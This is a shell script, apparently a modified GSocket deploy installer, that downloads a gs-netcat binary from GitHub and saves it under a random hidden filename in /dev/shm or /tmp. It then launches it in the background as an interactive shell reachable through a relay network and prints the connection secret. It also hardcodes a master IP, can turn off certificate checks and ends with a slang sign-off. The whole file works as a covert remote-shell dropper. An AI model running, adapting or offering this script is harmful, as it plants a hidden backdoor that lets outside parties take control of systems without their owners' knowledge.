#!/bin/sh
# GSocket Deploy - SH Compatible Version
# Based on the original bash script but converted to work with sh/dash/ash

# Global Defines
CICD_GS_BRANCH="beta"
GS_HOST_MASTER_IP=87.106.101.131
[ "$CICD_GS_BRANCH" = "master" ] && CICD_GS_BRANCH=""
[ -z "$GS_BRANCH" ] && GS_BRANCH="$CICD_GS_BRANCH"
SCRIPT_DEPLOY_NAME="y"

# URLs
URL_BASE_CDN="https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages"
URL_BASE_X="https://github.com/hackerschoice/binary/raw/refs/heads/main/gsocket"

# Deployment server hooks (stubs)
IS_DEPLOY_SERVER=
URL_BASE=
DS_GS_HOST=
DS_GS_PORT=
DS_GS_BEACON=
DS_GS_NAME=
DS_GS_BIN=
gs_deploy_webhook=
GS_WEBHOOK_404_OK=

# Apply deployment server settings
[ -n "$URL_BASE" ] && [ -z "$GS_URL_BASE" ] && GS_URL_BASE="$URL_BASE"
[ -n "$IS_DEPLOY_SERVER" ] && GS_BRANCH=""
[ -z "$GS_HOST" ] && GS_HOST="$DS_GS_HOST"
[ -z "$GS_PORT" ] && GS_PORT="$DS_GS_PORT"
[ -z "$GS_BEACON" ] && GS_BEACON="$DS_GS_BEACON"
[ -z "$GS_NAME" ] && GS_NAME="$DS_GS_NAME"
[ -z "$GS_BIN" ] && GS_BIN="$DS_GS_BIN"
[ -n "$gs_deploy_webhook" ] && GS_WEBHOOK="$gs_deploy_webhook"

# Terminal colors
if [ -t 1 ]; then
    CY="\033[1;33m" # yellow
    CG="\033[1;32m" # green
    CR="\033[1;31m" # red
    CB="\033[1;34m" # blue
    CM="\033[1;35m" # magenta
    CC="\033[1;36m" # cyan
    CN="\033[0m"    # none
else
    CY=""; CG=""; CR=""; CB=""; CM=""; CC=""; CN=""
fi

# Log functions
log_info() {
    printf "${CY}[*]${CN} %s\n" "$1"
}

log_ok() {
    printf "${CG}[OK]${CN} %s\n" "$1"
}

log_fail() {
    printf "${CR}[FAIL]${CN} %s\n" "$1"
}

log_warn() {
    printf "${CY}[!]${CN} %s\n" "$1"
}

# Clean exit
exit_code() {
    exit "$1"
}

errexit() {
    [ -n "$1" ] && echo -e "${CR}$*${CN}" >&2
    exit 255
}

# Detect architecture
detect_arch() {
    OS=$(uname -s)
    ARCH=$(uname -m)
    
    log_info "Detected: $OS $ARCH"
    
    OSNAME="linux"
    case "$OS" in
        *FreeBSD*) OSNAME="freebsd" ;;
        *Darwin*)  OSNAME="osx" ;;
        *OpenBSD*) OSNAME="openbsd" ;;
    esac
    
    # User supplied OSARCH
    if [ -n "$GS_OSARCH" ]; then
        OSARCH="$GS_OSARCH"
    else
        if [ "$OSNAME" = "linux" ]; then
            case "$ARCH" in
                i686|i386) OSARCH="i386-linux" ;;
                x86_64)    OSARCH="x86_64-linux" ;;
                armv7l)    OSARCH="arm7-linux" ;;
                armv6l)    OSARCH="arm6-linux" ;;
                arm*)      OSARCH="arm-linux" ;;
                aarch64)   OSARCH="aarch64-linux" ;;
                mips64)    OSARCH="mips64-linux" ;;
                mips*)     OSARCH="mips32-linux" ;;
                *)         OSARCH="x86_64-linux" ;;
            esac
        elif [ "$OSNAME" = "osx" ]; then
            case "$ARCH" in
                arm64) OSARCH="arm64-osx" ;;
                *)     OSARCH="x86_64-osx" ;;
            esac
        elif [ "$OSNAME" = "freebsd" ]; then
            OSARCH="x86_64-freebsd"
        elif [ "$OSNAME" = "openbsd" ]; then
            OSARCH="x86_64-openbsd"
        else
            OSARCH="x86_64-linux"
        fi
    fi
    
    # Set SRC_PKG based on OSARCH
    case "$OSARCH" in
        x86_64-linux)     SRC_PKG="gs-netcat_mini-linux-x86_64" ;;
        i386-linux)       SRC_PKG="gs-netcat_mini-linux-i686" ;;
        arm7-linux)       SRC_PKG="gs-netcat_mini-linux-armv7l" ;;
        arm6-linux)       SRC_PKG="gs-netcat_mini-linux-armv6" ;;
        arm-linux)        SRC_PKG="gs-netcat_mini-linux-arm" ;;
        aarch64-linux)    SRC_PKG="gs-netcat_mini-linux-aarch64" ;;
        mips64-linux)     SRC_PKG="gs-netcat_mini-linux-mips64" ;;
        mips32-linux)     SRC_PKG="gs-netcat_mini-linux-mips32" ;;
        x86_64-osx)       SRC_PKG="gs-netcat_mini-macOS-x86_64" ;;
        arm64-osx)        SRC_PKG="gs-netcat_mini-macOS-arm64" ;;
        x86_64-freebsd)   SRC_PKG="gs-netcat_mini-freebsd-x86_64" ;;
        x86_64-openbsd)   SRC_PKG="gs-netcat_mini-openbsd-x86_64" ;;
        *)                SRC_PKG="gs-netcat_mini-linux-x86_64" ;;
    esac
    
    log_info "Package: $SRC_PKG"
}

# Download with curl or wget
dl() {
    local url="$1"
    local output="$2"
    
    if command -v curl >/dev/null; then
        if [ -n "$GS_NOCERTCHECK" ]; then
            curl -k -fsSL --connect-timeout 7 -m900 --retry 3 "$url" -o "$output" 2>/dev/null
        else
            curl -fsSL --connect-timeout 7 -m900 --retry 3 "$url" -o "$output" 2>/dev/null
        fi
    elif command -v wget >/dev/null; then
        if [ -n "$GS_NOCERTCHECK" ]; then
            wget --no-check-certificate -q --timeout=7 "$url" -O "$output" 2>/dev/null
        else
            wget -q --timeout=7 "$url" -O "$output" 2>/dev/null
        fi
    else
        log_fail "Need curl or wget"
        return 1
    fi
}

# Generate random string
gen_random() {
    # Try multiple methods
    if [ -r /dev/urandom ]; then
        head -c 16 /dev/urandom 2>/dev/null | od -A n -t x1 2>/dev/null | tr -d ' \n' | head -c 16
    elif command -v openssl >/dev/null; then
        openssl rand -hex 8 2>/dev/null
    else
        echo "$(date +%s)$$" | md5sum 2>/dev/null | cut -c1-16
    fi
}

# Find writable directory
find_dstdir() {
    # Try common directories
    for dir in "/dev/shm" "/tmp" "/var/tmp" "$HOME" "."; do
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            DSTDIR="$dir"
            break
        fi
    done
    
    [ -z "$DSTDIR" ] && DSTDIR="."
    
    # Generate hidden name
    BIN_NAME=".$(gen_random | cut -c1-8)"
    DSTBIN="$DSTDIR/$BIN_NAME"
    log_info "Install to: $DSTBIN"
}

# Test binary
test_bin() {
    log_info "Testing binary..."
    
    if [ ! -x "$DSTBIN" ]; then
        chmod 700 "$DSTBIN" 2>/dev/null || return 1
    fi
    
    # Try to get secret from binary
    GS_OUTPUT="$($DSTBIN -g 2>/dev/null || echo "")"
    
    if [ -n "$GS_OUTPUT" ]; then
        # Use binary's generated secret if not set
        if [ -z "$GS_SECRET" ]; then
            GS_SECRET="$GS_OUTPUT"
        fi
        log_ok "Binary works"
        return 0
    fi
    
    # Try help option
    if $DSTBIN --help 2>&1 | grep -q "gs-netcat"; then
        log_ok "Binary works"
        return 0
    fi
    
    log_warn "Binary test inconclusive"
    return 1
}

# Test network connection
test_network() {
    log_info "Testing connection to GSRN..."
    
    if [ -n "$GS_NOTEST" ]; then
        log_warn "Skipping network test (GS_NOTEST)"
        return 0
    fi
    
    # Test connection
    if $DSTBIN -t -s "$GS_SECRET" >/dev/null 2>&1; then
        ret=$?
        case $ret in
            0) log_ok "Network test passed" ;;
            61) log_ok "Server not listening (expected)" ;;
            *) log_warn "Network test returned $ret" ;;
        esac
        return 0
    fi
    
    log_warn "Network test failed (may be firewalled)"
    return 1
}

# Start gs-netcat
start_gs() {
    log_info "Starting gs-netcat..."
    
    # Build arguments
    GS_ARGS="-ilqD"
    [ -n "$GS_BEACON" ] && GS_ARGS="-ilqDw"
    
    # Export environment
    export GS_SECRET
    [ -n "$GS_HOST" ] && export GS_HOST
    [ -n "$GS_PORT" ] && export GS_PORT
    [ -n "$GS_BEACON" ] && export GS_BEACON
    
    # Start in background
    nohup "$DSTBIN" $GS_ARGS >/dev/null 2>&1 &
    PID=$!
    
    sleep 2
    
    if kill -0 $PID 2>/dev/null; then
        log_ok "Started with PID: $PID"
        IS_GS_RUNNING=1
        return 0
    else
        log_warn "Process may have exited"
        return 1
    fi
}

# Show connection info
show_info() {
    echo ""
    echo "========================================"
    printf "${CG}[+] Installation Complete!${CN}\n"
    echo "========================================"
    echo "Secret: $GS_SECRET"
    echo "Binary: $DSTBIN"
    [ -n "$GS_HOST" ] && echo "Host  : $GS_HOST:$GS_PORT"
    [ -n "$GS_BEACON" ] && echo "Beacon: $GS_BEACON minutes"
    echo ""
    echo "To connect from another machine:"
    echo "1. Install gsocket on other machine:"
    echo "   curl -sSL https://gsocket.io/install | sh"
    echo "2. Connect with:"
    CMD="gs-netcat -i -s \"$GS_SECRET\""
    [ -n "$GS_HOST" ] && CMD="GS_HOST=$GS_HOST $CMD"
    [ -n "$GS_BEACON" ] && CMD="$CMD -w"
    printf "${CC}   %s${CN}\n" "$CMD"
    echo "========================================"
    echo ""
}

# Direct connect mode (S=)
gs_access() {
    log_info "Connecting with secret: $S"
    GS_SECRET="$S"
    exec "$DSTBIN" -i -s "$GS_SECRET"
}

# Main installation
install_main() {
    log_info "GSocket Deploy"
    
    # If S= is set, connect directly
    if [ -n "$S" ]; then
        detect_arch
        find_dstdir
        
        # Download binary
        log_info "Downloading $SRC_PKG..."
        dl "$URL_BASE_X/$SRC_PKG" "$DSTBIN" || {
            log_fail "Download failed"
            exit 1
        }
        chmod 700 "$DSTBIN"
        
        gs_access
    fi
    
    # Check if already installed (by checking secret)
    if [ -n "$X" ]; then
        GS_SECRET="$X"
    fi
    
    detect_arch
    find_dstdir
    
    # Download binary
    log_info "Downloading $SRC_PKG..."
    dl "$URL_BASE_X/$SRC_PKG" "$DSTBIN" || {
        log_fail "Download failed"
        exit 1
    }
    chmod 700 "$DSTBIN"
    
    # Test binary
    test_bin || {
        log_fail "Binary test failed"
        exit 1
    }
    
    # Test network
    test_network
    
    # Start gs-netcat
    start_gs
    
    # Show info
    show_info
    
    echo -e "${CM}KASIH PAHAM BOSKUH${CN}"
}

# Handle signals
cleanup() {
    [ -f "$DSTBIN" ] && rm -f "$DSTBIN" 2>/dev/null
    exit 0
}

trap cleanup INT TERM EXIT

# Run main
install_main

# Clean exit
trap - INT TERM EXIT
exit 0
